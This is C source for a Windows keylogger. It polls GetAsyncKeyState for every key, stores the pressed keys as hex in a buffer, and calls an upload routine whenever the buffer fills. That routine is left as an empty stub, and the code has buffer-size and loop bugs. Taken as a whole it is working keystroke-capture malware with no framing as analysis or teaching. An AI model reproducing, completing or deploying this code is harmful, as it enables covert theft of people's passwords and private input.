#include <windows.h>
#include <stdio.h>

//Globals for storage and count of key presses
char KeyBuffer[18];
int KeyBufferIndex = 0;
int TempIndex = 0;

//void SaveKey(char key);
void SaveKey(int key);

int main(void)
{
  SHORT lResult;
  
  
  while( 1 )
  {
      //Iterate over each possible key on the keyboard (vKey) \x00 - \xFF 
      for (char c = 0; c < 255; c++)
      {
          //Check each vKey and store the result - key was pressed if LSB is set
          lResult = GetAsyncKeyState(c);
          //Check if LSB was set
          if (lResult & 1)
          {
              //Append the vKey value to the buffer of pressed keys
              SaveKey(c);
          }
      }
  }
  return 0;
}

void SaveKey(int key)
{
    //Saves 9 key presses into a buffer before uploading them

    //Create a temporary char buffer to store single byte hex values in
    char temp[2];
    //Convert int representation of keypress (0-255) into hex byte (0x00 - 0xFF)
    itoa(key, temp, 16);

    //Append first byte to the buffer
    KeyBuffer[TempIndex] = temp[0];
    TempIndex ++;
    //Append second byte to the buffer
    KeyBuffer[TempIndex] = temp[1];
    TempIndex ++;

    KeyBufferIndex ++;

    //If the buffer is full print it and reset
    if(KeyBufferIndex > 9)
    {
        //printf("Keys pressed: %s\n", KeyBuffer);
        upload();
        KeyBufferIndex = 0;
        TempIndex = 0;
    }
}

int upload(void)
{

}


